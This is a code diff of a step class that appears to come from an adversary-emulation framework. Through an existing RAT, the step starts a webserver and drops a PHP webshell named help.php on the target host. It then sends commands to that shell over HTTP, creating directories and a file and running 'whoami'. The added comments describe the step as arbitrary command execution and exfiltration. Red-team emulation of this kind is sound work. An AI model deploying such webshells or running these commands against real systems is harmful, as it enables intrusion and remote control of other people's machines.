@@ -9,13 +9,12 @@ class WebShellExecution(Step):
             This step only requires the existence of a RAT on a host in order to run.
     """
     display_name = 'webshell_execution'
-    summary = 'Find open ports (externally) on the current host.'
+    summary = 'Set up a reverse webshell to run arbitrary command or exfiltrate data'
     attack_mapping = [('T1094', 'Command and Control')]
     preconditions = [('rat', OPRat({'elevated': True})),
                      ('host', OPHost(OPVar('software.host'))),
                      ('software', OPSoftware({'name': 'webserver', 'installed': True }))]
     postconditions = [('process_g', OPProcess), ('file_g', OPFile)]
-
     significant_parameters = ['host']
 
     @staticmethod
@@ -24,25 +23,25 @@ class WebShellExecution(Step):
 
     @staticmethod
     async def action(operation, rat, host, software, process_g, file_g):
+        # Start webserver
         webserver_location = (software.install_loc + 'usbwebserver.exe')
-        successful = (await operation.execute_shell_command(rat, command.CommandLine('powershell /command "$completed = $false; while(-not $completed){{ try {{ Start-Process \'{}\'; $completed = $true; }} catch {{ start-sleep 5; }} }}"'.format(webserver_location)), (lambda x: (x.strip() == ''))))
+        successful = await operation.execute_shell_command(rat, command.CommandLine('powershell /command "$completed = $false; while(-not $completed){{ try {{ Start-Process \'{}\'; $completed = $true; }} catch {{ start-sleep 5; }} }}"'.format(webserver_location)), (lambda x: (x.strip() == '')))
+
         if successful:
-            (await process_g({
-                'image_name': get_image_name(webserver_location),
-                'host': host,
-            }))
+            # Register webserver process
+            await process_g({'image_name': get_image_name(webserver_location), 'host': host})
+            # Drop reverse webshell file
             destination = (software.install_loc + 'root\\help.php')
-            (await operation.drop_file(rat, file_path_dest=destination, file_path_src=os.path.join('plugins', 'adversary', 'filestore', 'webshell.php')))
-            (await file_g({
-                'path': destination,
-                'host': host,
-            }))
+            await operation.drop_file(rat, file_path_dest=destination, file_path_src=os.path.join('plugins', 'adversary', 'filestore', 'webshell.php'))
+            await file_g({'path': destination, 'host': host})
+            # Check if it works:
             try:
-                params = {
-                    'cmd': 'mkdir wamp && mkdir wamp\\www && (echo test > wamp/www/info.php)',
-                }
+                # Run arbitrary command (creating a file on the victim's machine)
+                params = {'cmd': 'mkdir wamp && mkdir wamp\\www && (echo test > wamp/www/info.php)'}
                 requests.get('http://{}:8080/help.php?{}'.format(host.fqdn, urlencode(params, quote_via=quote_plus))).text
+                # Run simple exfiltration command
                 result = requests.get('http://{}:8080/help.php?cmd={}'.format(host.fqdn, 'whoami')).text
+                # If something was returned, we assume the action was successful
                 return ((result is not None) and (result != ''))
             except requests.exceptions.RequestException as e:
                 print(e)
